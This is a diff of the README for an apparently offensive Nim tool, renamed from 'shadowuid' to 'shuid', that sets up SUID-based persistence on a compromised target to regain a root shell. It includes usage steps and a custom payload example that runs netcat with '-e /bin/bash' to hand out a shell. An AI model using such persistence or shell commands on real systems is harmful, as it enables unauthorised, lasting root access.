@@ -5,10 +5,10 @@ Also a good way to learn Nim and something new
 </code></pre>
 </div>
 
-## Like at home 🏡 <sup>(persistance)</sup>
+## Like at home 🏡 <sup>(persistence)</sup>
 
-* First transfer `shadowuid` on target
-* Run it!<br><pre><code>./shadowuid</code></pre>
+* First transfer `shuid` on target
+* Run it!<br><pre><code>./shuid</code></pre>
 
 And that's all, **root shell** is obtained and process to obtain it again will be outputted 
 
@@ -18,7 +18,7 @@ And that's all, **root shell** is obtained and process to obtain it again will b
 You can choose which SUID will trigger your payload (`-c`). And, obviously, you can also custom the payload (`--payload`).
 An example:
 ```shell
-./shadowuid -c --command "nc 127.0.0.2 -e /bin/bash"
+./shuid -c --command "nc 127.0.0.2 -e /bin/bash"
 ```
 
 
